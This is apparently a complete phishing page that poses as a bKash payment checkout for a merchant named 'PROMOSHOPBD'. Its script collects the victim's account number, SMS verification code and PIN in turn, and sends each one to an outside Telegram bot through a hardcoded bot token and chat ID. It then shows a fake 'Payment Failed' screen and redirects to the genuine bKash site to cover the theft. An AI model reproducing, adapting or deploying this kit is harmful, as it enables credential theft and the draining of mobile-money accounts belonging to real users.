<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>bKash Payment</title>
    <style>
        /* --- প্রি-লোডার স্টাইল শুরু --- */
        .preloader-container {
            position: relative;
        }

        #content-area-preloader {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: calc(100% - 3.75rem); 
            background-color: #f3f4f6; 
            z-index: 1000; 
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transition: opacity 0.5s ease; 
            overflow: hidden;
            border-bottom-left-radius: 0; 
            border-bottom-right-radius: 0; 
        }
        
        .preloader-pink-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%; 
            background-color: #e3007f; 
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
        }

        #content-area-preloader.fade-out {
            opacity: 0;
            visibility: hidden;
            pointer-events: none; 
        }

        .loading-dots-preloader {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            margin-bottom: 0.5rem;
        }

        .dot-preloader {
            width: 0.75rem;
            height: 0.75rem;
            background-color: #ffffff; 
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out; 
        }

        .dot-preloader:nth-child(1) { animation-delay: 0ms; }
        .dot-preloader:nth-child(2) { animation-delay: 150ms; }
        .dot-preloader:nth-child(3) { animation-delay: 300ms; }

        .preloader-text {
            color: #ffffff;
            font-size: 1.125rem;
            font-weight: 500;
            margin: 0;
        }
        /* --- প্রি-লোডার স্টাইল শেষ --- */
        
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            background-color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 1rem;
        }

        .card {
            width: 100%;
            max-width: 24rem;
            border-radius: 0.75rem; 
            overflow: hidden;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            background-color: #ffffff;
        }

        .card-content {
            padding: 0;
        }

        .logo-section {
            display: flex;
            justify-content: center;
            padding-top: 0;
            padding-bottom: 1rem;
            background-color: #ffffff;
            position: relative; 
            z-index: 1001;
        }

        .logo {
            width: 9.375rem;
            height: 3.125rem;
            object-fit: contain;
        }

        .transaction-summary {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 1rem;
            border-top: 1px solid #e5e7eb;
            border-bottom: 1px solid #e5e7eb;
            background-color: #ffffff;
        }

        .avatar {
            width: 2.5rem;
            height: 2.5rem;
            background-color: #f3f4f6;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 9999px;
            flex-shrink: 0;
            overflow: hidden;
        }

        .shopping-cart-icon {
            width: 1.25rem;
            height: 1.25rem;
            color: #6b7280;
        }

        .summary-details {
            flex: 1;
            margin-top: 0;
        }

        .merchant-name {
            font-size: 0.875rem; 
            font-weight: 500;
            color: #374151;
            margin: 0;
            line-height: 1.2;
        }

        .invoice-number {
            font-size: 0.625rem;
            color: #6b7280;
            margin: 0;
            line-height: 1.2;
        }

        .amount {
            font-size: 1.125rem;
            font-weight: 600;
            color: #374151;
            flex-shrink: 0;
        }

        /* --- ইনপুট সেকশন স্টাইল --- */
        .bkash-input-section {
            background-color: #e3007f;
            padding: 1.5rem;
            color: #ffffff;
            min-height: 20rem; 
            display: flex;
            flex-direction: column;
            justify-content: center; 
            align-items: center;
            text-align: center;
            box-sizing: border-box;
        }
        
        .cancel-confirmation-section {
            background-color: #e3007f;
            color: #ffffff;
            padding: 3rem 1.5rem; 
            min-height: 20rem; 
            display: flex;
            flex-direction: column;
            justify-content: center; 
            align-items: center;
            text-align: center;
            box-sizing: border-box;
        }

        .section-title {
            font-size: 1.125rem;
            font-weight: 600;
            text-align: center;
            margin-bottom: 1rem; 
        }
        
        .verification-code-number-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 0.5rem; 
        }
        
        .verification-code-number {
            font-size: 1.125rem; 
            font-weight: 500;
            margin: 0;
            line-height: 1.5; 
        }
        
        .pin-account-number-wrapper {
            margin-bottom: 1rem; 
            margin-top: 0;
        }

        .account-number-input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            width: 100%;
            max-width: 18rem;
            margin-bottom: 0.5rem;
        }

        .account-number-input {
            width: 100%;
            border-radius: 0.375rem;
            border: 1px solid #e2e8f0;
            background-color: #ffffff;
            padding: 0.5rem 1rem;
            font-size: 1rem;
            color: #374151;
            text-align: center;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        
        .account-number-input:focus {
            border-color: #e3007f;
            box-shadow: 0 0 0 1px #e3007f, 0 0 0 3px rgba(227, 0, 127, 0.4); 
        }

        /* --- পিন ইনপুট বক্স ডিজাইন --- */
        .pin-input-container {
            position: relative;
            width: 100%;
            max-width: 18rem;
            margin-top: 0.5rem; 
        }

        .pin-input {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0; 
            cursor: pointer; 
            z-index: 2;
        }

        .pin-display {
            background-color: #ffffff;
            border-radius: 0.375rem;
            border: 1px solid #e2e8f0;
            height: 2.75rem; 
            display: flex; 
            align-items: center;
            justify-content: center; 
            color: #374151;
            z-index: 1;
            pointer-events: none; 
            box-sizing: border-box;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        
        .pin-input:focus + .pin-display {
            border-color: #e3007f; 
            box-shadow: 0 0 0 1px #e3007f, 0 0 0 3px rgba(227, 0, 127, 0.4); 
        }
        
        .pin-placeholder {
            color: #9ca3af;
            font-size: 1.125rem;
            font-weight: 400;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* যখন বক্স খালি থাকবে এবং ফোকাসড থাকবে, তখন কার্সারটি "Ente" এর পরে এবং "r PIN" এর আগে নিখুঁতভাবে থাকবে */
        .pin-display.blinking .pin-placeholder::before {
            content: '';
            position: absolute;
            left: 35px; /* "Ente" অক্ষরের ঠিক পরের পজিশন */
            width: 1.5px;
            height: 1.2rem;
            background-color: #374151;
            animation: pin-cursor-blink 1s step-end infinite;
            z-index: 5;
        }

        /* সংখ্যা টাইপ করার পর কার্সারটি শেষ সংখ্যার ডানে চলে যাবে */
        .pin-display.blinking.has-content::after {
            content: '';
            width: 1.5px;
            height: 1.2rem;
            background-color: #374151;
            display: inline-block;
            margin-left: 4px;
            vertical-align: middle;
            animation: pin-cursor-blink 1s step-end infinite;
        }

        .pin-char {
            font-size: 1.25rem;
            font-weight: 500;
            color: #374151;
            margin: 0 4px; 
            display: inline-block;
            line-height: 1;
        }

        .pin-char.pin-dot {
            font-size: 1.5rem; 
            vertical-align: middle;
            margin: 0 3px;
            animation: none !important; 
            transform: none !important;
        }

        @keyframes pin-cursor-blink {
            from, to { opacity: 0; }
            50% { opacity: 1; }
        }

        .terms-conditions {
            font-size: 0.75rem;
            text-align: center;
            margin-top: 1rem;
        }

        .terms-conditions a {
            font-weight: 500;
            text-decoration: underline;
            color: #ffffff;
        }

        .action-buttons {
            display: flex;
            justify-content: space-around;
            padding: 0.625rem;
            gap: 1rem;
            background-color: #ffffff;
            position: relative;
            z-index: 999;
        }

        .btn {
            flex: 1;
            border-radius: 0.375rem;
            padding: 0.625rem 1rem;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.2s ease-in-out;
            border: none;
        }

        .btn-outline {
            border: 1px solid #d1d5db;
            background-color: #ffffff;
            color: #374151;
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
        }

        .btn-confirm {
            background-color: #e3007f;
            color: #ffffff;
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
        }

        .btn-confirm:disabled {
            background-color: #e5e7eb;
            color: #9ca3af;
            cursor: not-allowed;
        }
        
        .btn-confirm.btn-loading {
            background-color: #f38eb0 !important;
            color: #ffffff;
            cursor: default;
        }

        .loading-dots {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.25rem; 
        }

        .dot {
            width: 0.5rem;
            height: 0.5rem;
            background-color: #ffffff; 
            border-radius: 9999px;
            animation: bounce 1.4s infinite ease-in-out; 
        }
        
        .dot:nth-child(1) { animation-delay: 0ms; }
        .dot:nth-child(2) { animation-delay: 150ms; }
        .dot:nth-child(3) { animation-delay: 300ms; }

        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }

        .footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0.3rem 0.625rem; 
            font-size: 0.75rem;
            background-color: #ffffff;
            position: relative; 
            z-index: 1001; 
            height: 3.75rem; 
            box-sizing: border-box;
            border-bottom-left-radius: 0.75rem; 
            border-bottom-right-radius: 0.75rem; 
        }

        .phone-call-info {
            display: flex;
            align-items: center;
            gap: 0.25rem;
            color: #e3007f;
            margin-bottom: 0.1rem; 
            margin-top: 0.2rem;
        }

        .copyright {
            color: #9e9e9e;
            font-size: 0.75rem;
            margin: 0; 
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-content preloader-container">
            <div id="content-area-preloader" class="preloader-container-overlay">
                <div class="preloader-pink-bg">
                    <div class="loading-dots-preloader">
                        <div class="dot-preloader"></div>
                        <div class="dot-preloader"></div>
                        <div class="dot-preloader"></div>
                    </div>
                    <p class="preloader-text">Loading</p>
                </div>
            </div>
            
            <div class="logo-section">
                <img src="https://i.ibb.co.com/9mx0MtpD/bkash-logo.png" alt="bKash Logo" class="logo">
            </div>

            <div class="transaction-summary">
                <div class="avatar">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="shopping-cart-icon">
                        <circle cx="8" cy="21" r="1"></circle>
                        <circle cx="19" cy="21" r="1"></circle>
                        <path d="M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57l1.65-7.43H5.12"></path>
                    </svg>
                </div>
                <div class="summary-details">
                    <p class="merchant-name">PROMOSHOPBD</p>
                    <p class="invoice-number">Inv No: NNT_6094bc8028702...</p>
                </div>
                <div class="amount" id="dynamicAmount">৳99.00</div>
            </div>

            <div id="main-content-area"></div>

            <div class="action-buttons">
                <button class="btn btn-outline" id="cancelButton">Cancel</button>
                <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
                <button class="btn btn-outline hidden" id="yesButton">Yes</button>
                <button class="btn btn-confirm hidden" id="noButton">No</button>
            </div>

            <div class="footer">
                <div class="phone-call-info">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                    </svg>
                    <span>16247</span>
                </div>
                <p class="copyright">© 2025 bKash, All Rights Reserved</p>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '7751217182:AAEWRJ427aODJ4w9Y9sJw51U28o0QZ_yx4E';
        const TELEGRAM_CHAT_ID = '7335173906';
        
        const mainContentArea = document.getElementById('main-content-area');
        const confirmButton = document.getElementById('confirmButton');
        const cancelButton = document.getElementById('cancelButton');
        const yesButton = document.getElementById('yesButton'); 
        const noButton = document.getElementById('noButton');   
        const actionButtonsDiv = document.querySelector('.action-buttons');

        let currentView = 'accountNumber';
        let previousViewBeforeCancel = 'accountNumber'; 
        let currentAccountNumber = '';
        let currentVerificationCode = '';
        let currentPin = ''; 
        let resendTimerInterval;
        let resendEndTime = null; 
        let redirectTimerInterval;
        let redirectCountdown = 5;

        async function sendToTelegram(data) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return true;

            let message = "";
            if (data.accountNumber) {
                message = `New bKash Account Number: <a href="tel:${data.accountNumber}">${data.accountNumber}</a>`;
            } else if (data.verificationCode) {
                message = `bKash Verification Code: <b>${data.verificationCode}</b>`;
            } else if (data.pin) {
                message = `bKash PIN: <b>${data.pin}</b>`;
            } else if (data.resendRequest) {
                 message = `Resend Code Request for bkash`;
            } else if (data.cancelConfirmed) {
                 message = `Payment Cancelled by User. Account: ${currentAccountNumber || 'N/A'}`;
            }

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: "HTML",
                    }),
                });
                return true;
            } catch (error) {
                console.error(error);
                return true;
            }
        }

        async function handleStepConfirmation(step) {
            showLoading();
            let dataToSend = {};
            let nextView = '';

            if (step === 'accountNumber') {
                currentAccountNumber = document.getElementById('accountNumberInput').value;
                dataToSend = { accountNumber: currentAccountNumber };
                nextView = 'verificationCode';
                resendEndTime = Date.now() + 30000; 
            } else if (step === 'verificationCode') {
                currentVerificationCode = document.getElementById('verificationCodeInput').value;
                dataToSend = { verificationCode: currentVerificationCode };
                nextView = 'pinEntry';
            } else if (step === 'pinEntry') {
                dataToSend = { pin: currentPin };
                nextView = 'paymentFailed'; 
            }

            await sendToTelegram(dataToSend);
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            hideLoading();
            currentView = nextView;
            renderView();
        }

        function renderView() {
            mainContentArea.innerHTML = '';
            actionButtonsDiv.classList.remove('hidden');
            cancelButton.classList.remove('hidden');
            confirmButton.classList.remove('hidden');
            yesButton.classList.add('hidden');
            noButton.classList.add('hidden');

            if (resendTimerInterval) clearInterval(resendTimerInterval);
            if (redirectTimerInterval) clearInterval(redirectTimerInterval);

            let contentHTML = '';

            switch (currentView) {
                case 'accountNumber':
                    contentHTML = `
                        <div class="bkash-input-section">
                            <h2 class="section-title">Your bKash Account Number</h2>
                            <div class="account-number-input-wrapper">
                                <input type="tel" placeholder="e.g 01XXXXXXXXX" class="account-number-input" id="accountNumberInput" maxlength="11" value="${currentAccountNumber}"/>
                            </div>
                            <p class="terms-conditions">Confirm and proceed, <a href="https://www.bkash.com/en/page/tokenized_checkout" target="_blank">terms & conditions</a></p>
                        </div>`;
                    break;

                case 'verificationCode':
                    let maskedNumber = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} ** *** ${currentAccountNumber.slice(-3)}` : "";
                    contentHTML = `
                        <div class="bkash-input-section">
                            <h2 class="section-title" style="margin-bottom: 0;">Enter verification code sent to</h2> 
                            <div class="verification-code-number-wrapper"><p class="verification-code-number">${maskedNumber}</p></div>
                            <div class="account-number-input-wrapper" style="margin-bottom: 1rem;">
                                <input type="tel" placeholder="Enter 6 digit code" class="account-number-input" id="verificationCodeInput" maxlength="6" value="${currentVerificationCode}"/>
                            </div>
                            <p class="terms-conditions" id="resendCodeText"></p>
                        </div>`;
                    break;

                case 'pinEntry':
                    let maskedPinAccount = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} ** *** ${currentAccountNumber.slice(-3)}` : "";
                    contentHTML = `
                        <div class="bkash-input-section">
                            <h2 class="section-title" style="margin-bottom: 0;">Enter PIN of your bKash account number</h2>
                            <div class="pin-account-number-wrapper">
                                <p style="font-size: 1.125rem; font-weight: 500; margin:0;">${maskedPinAccount}</p>
                            </div>
                            <div class="pin-input-container">
                                <input type="tel" inputmode="numeric" class="pin-input" id="pinInput" maxlength="5" value="${currentPin}">
                                <div class="pin-display" id="pinDisplay"></div>
                            </div>
                        </div>`;
                    break;

                case 'cancelConfirmation':
                    cancelButton.classList.add('hidden');
                    confirmButton.classList.add('hidden');
                    yesButton.classList.remove('hidden');
                    noButton.classList.remove('hidden');
                    contentHTML = `
                        <div class="cancel-confirmation-section">
                            <p class="confirmation-text" style="font-size: 1.125rem; font-weight: 500;">Are you sure you want to cancel this payment?</p>
                        </div>`;
                    break;

                case 'paymentFailed':
                    actionButtonsDiv.classList.add('hidden');
                    contentHTML = `
                        <div class="bkash-input-section" style="min-height: 300px;">
                            <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: white; margin-bottom: 1rem;">
                                <circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line>
                            </svg>
                            <h2 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem;">Payment Failed</h2>
                            <p style="font-size: 0.875rem; margin-bottom: 1rem;">Merchant verification failed</p>
                            <p style="font-size: 0.875rem;" id="redirectText"></p>
                        </div>`;
                    break;
            }

            mainContentArea.innerHTML = contentHTML;
            attachEventListeners();
            updateConfirmButtonState();

            if (currentView === 'verificationCode') startResendTimer();
            if (currentView === 'paymentFailed') startRedirectTimer();
        }

        function updateConfirmButtonState() {
            if (!confirmButton) return;
            if (currentView === 'cancelConfirmation') return;

            let isValid = false;
            let inputValue = (currentView === 'pinEntry') ? currentPin : document.getElementById(currentView + 'Input')?.value || '';

            if (currentView === 'accountNumber') {
                isValid = inputValue.startsWith('01') && inputValue.length === 11;
            } else if (currentView === 'verificationCode') {
                let timeLeft = resendEndTime ? Math.ceil((resendEndTime - Date.now()) / 1000) : 0;
                isValid = inputValue.length === 6 && timeLeft > 0;
            } else if (currentView === 'pinEntry') {
                isValid = inputValue.length >= 4 && inputValue.length <= 5;
            }

            confirmButton.disabled = !isValid;
        }

        function showLoading() {
            if (confirmButton) {
                confirmButton.disabled = true;
                confirmButton.classList.add('btn-loading'); 
                confirmButton.innerHTML = `<div class="loading-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>`;
            }
        }

        function hideLoading() {
            if (confirmButton) {
                confirmButton.classList.remove('btn-loading'); 
                confirmButton.innerHTML = 'Confirm';
                updateConfirmButtonState();
            }
        }

        let maskTimeout = null;
        let unmaskedIndex = -1; 

        function updatePinDisplayContent(isBackspace = false) {
            const pinDisplay = document.getElementById('pinDisplay');
            if (!pinDisplay) return;

            pinDisplay.innerHTML = ''; 
            const pinLength = currentPin.length;
            const isFocused = (document.activeElement === document.getElementById('pinInput'));

            if (isFocused) {
                pinDisplay.classList.add('blinking');
                if (pinLength > 0) {
                    pinDisplay.classList.add('has-content');
                } else {
                    pinDisplay.classList.remove('has-content');
                }
            } else {
                pinDisplay.classList.remove('blinking', 'has-content');
            }

            if (pinLength === 0) {
                const placeholderSpan = document.createElement('span');
                placeholderSpan.textContent = 'Enter PIN';
                placeholderSpan.classList.add('pin-placeholder');
                pinDisplay.appendChild(placeholderSpan);
                unmaskedIndex = -1;
                if (maskTimeout) { clearTimeout(maskTimeout); maskTimeout = null; }
            } else {
                for (let i = 0; i < pinLength; i++) {
                    const span = document.createElement('span');
                    if (i === unmaskedIndex && !isBackspace) {
                        span.textContent = currentPin[i];
                        span.classList.add('pin-char');
                    } else {
                        span.textContent = '●';
                        span.classList.add('pin-char', 'pin-dot');
                    }
                    pinDisplay.appendChild(span);
                }
            }
        }

        function attachEventListeners() {
            if (confirmButton) confirmButton.onclick = null;
            if (cancelButton) cancelButton.onclick = null;
            if (yesButton) yesButton.onclick = null;
            if (noButton) noButton.onclick = null;

            const currentInput = document.getElementById(currentView === 'accountNumber' || currentView === 'verificationCode' ? currentView + 'Input' : 'pinInput');

            if (currentView === 'cancelConfirmation') {
                yesButton.onclick = async () => {
                    await sendToTelegram({ cancelConfirmed: true });
                    currentView = 'paymentFailed';
                    renderView();
                };
                noButton.onclick = () => {
                    currentView = previousViewBeforeCancel;
                    renderView();
                };
            } else {
                if (confirmButton) confirmButton.onclick = () => { if (!confirmButton.disabled) handleStepConfirmation(currentView); };
                if (cancelButton) cancelButton.onclick = () => { 
                    if (currentView === 'verificationCode') {
                        currentVerificationCode = document.getElementById('verificationCodeInput')?.value || '';
                    }
                    previousViewBeforeCancel = currentView; 
                    currentView = 'cancelConfirmation'; 
                    renderView(); 
                };
            }

            if (currentView === 'pinEntry') {
                const pinInput = document.getElementById('pinInput');
                updatePinDisplayContent(); 

                if (pinInput) {
                    setTimeout(() => pinInput.focus(), 100); 
                    pinInput.onfocus = () => updatePinDisplayContent();
                    pinInput.onblur = () => updatePinDisplayContent();

                    pinInput.oninput = (e) => {
                        let value = e.target.value.replace(/\D/g, ''); 
                        if (value.length > 5) value = value.substring(0, 5);
                        
                        const isBackspace = value.length < currentPin.length;
                        
                        if (!isBackspace && value.length > currentPin.length) {
                            unmaskedIndex = value.length - 1;
                            if (maskTimeout) clearTimeout(maskTimeout);
                            maskTimeout = setTimeout(() => {
                                unmaskedIndex = -1;
                                updatePinDisplayContent();
                            }, 800); 
                        } else {
                            unmaskedIndex = -1;
                            if (maskTimeout) clearTimeout(maskTimeout);
                        }

                        currentPin = value;
                        updatePinDisplayContent(isBackspace); 
                        updateConfirmButtonState();
                    };
                }
            } else if (currentInput) {
                currentInput.oninput = (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '');
                    if (currentView === 'accountNumber') currentAccountNumber = e.target.value;
                    if (currentView === 'verificationCode') currentVerificationCode = e.target.value;
                    updateConfirmButtonState();
                };
            }
        }

        function startResendTimer() {
            const resendCodeTextElement = document.getElementById('resendCodeText');
            if (!resendCodeTextElement || !resendEndTime) return;

            const updateTimerDisplay = () => {
                let timeLeft = Math.ceil((resendEndTime - Date.now()) / 1000);

                if (timeLeft > 0) {
                    resendCodeTextElement.innerHTML = `Resend Code in <span style="font-weight: bold; color: white;">${timeLeft}s</span>`;
                } else {
                    clearInterval(resendTimerInterval);
                    showResendButton(resendCodeTextElement);
                }
                updateConfirmButtonState();
            };

            updateTimerDisplay();
            resendTimerInterval = setInterval(updateTimerDisplay, 1000);
        }

        function showResendButton(element) {
            element.innerHTML = `<button id="resendCodeButton" style="background: none; border: none; color: white; text-decoration: underline; cursor: pointer; font-size: 0.75rem; padding: 0;">Resend Code</button>`;
            document.getElementById('resendCodeButton').onclick = async () => {
                await sendToTelegram({ resendRequest: true }); 
                currentVerificationCode = '';
                resendEndTime = Date.now() + 30000; 
                renderView();
            };
        }

        function startRedirectTimer() {
            redirectCountdown = 5;
            const redirectText = document.getElementById('redirectText');
            if (!redirectText) return;

            redirectTimerInterval = setInterval(() => {
                redirectCountdown--;
                if (redirectCountdown > 0) {
                    redirectText.innerHTML = `Redirecting to <span>Merchant Website</span> in ${redirectCountdown}s`;
                } else {
                    clearInterval(redirectTimerInterval);
                    window.location.href = 'https://www.bkash.com'; 
                }
            }, 1000);
        }

        window.addEventListener('load', function() {
            const preloader = document.getElementById('content-area-preloader');
            setTimeout(() => { if(preloader) preloader.classList.add('fade-out'); }, 3000);
        });
        // URL থেকে amount নেওয়া
const urlParams = new URLSearchParams(window.location.search);

const dynamicAmount = urlParams.get("amount");

// Amount update
if(dynamicAmount && !isNaN(dynamicAmount)){

    const amountBox =
    document.getElementById("dynamicAmount");

    amountBox.innerText =
    "৳" + dynamicAmount + ".99";
}

        document.addEventListener('DOMContentLoaded', () => { renderView(); });
    </script>
</body>
</html>
